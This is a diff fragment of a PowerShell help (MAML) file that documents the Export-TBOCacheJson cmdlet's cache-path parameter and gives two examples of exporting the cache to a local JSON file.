+          <maml:para>Optional cache database path override. If omitted, the cache path is resolved using the TITANIS_TBO_CACHE environment variable or the per-user default path.</maml:para>
+        </maml:description>
+        <command:parameterValue>String</command:parameterValue>
+      </command:parameter>
+    </command:parameters>
+    <command:examples>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 1 --------------------------</command:title>
+        <maml:code>Export-TBOCacheJson | Set-Content -Path .\tbo-cache-export.json -Encoding utf8</maml:code>
+        <maml:remarks>
+          <maml:para>Exports the cache as JSON.</maml:para>
+        </maml:remarks>
+      </command:example>
+      <command:example>
+        <command:title>-------------------------- EXAMPLE 2 --------------------------</command:title>
+        <maml:code>Export-TBOCacheJson -Path C:\Temp\tbo-cache.sqlite3 | Set-Content -Path .\tbo-cache-export.json -Encoding utf8</maml:code>
+        <maml:remarks>
+          <maml:para>Exports a specific cache file.</maml:para>
         </maml:remarks>
       </command:example>
     </command:examples>
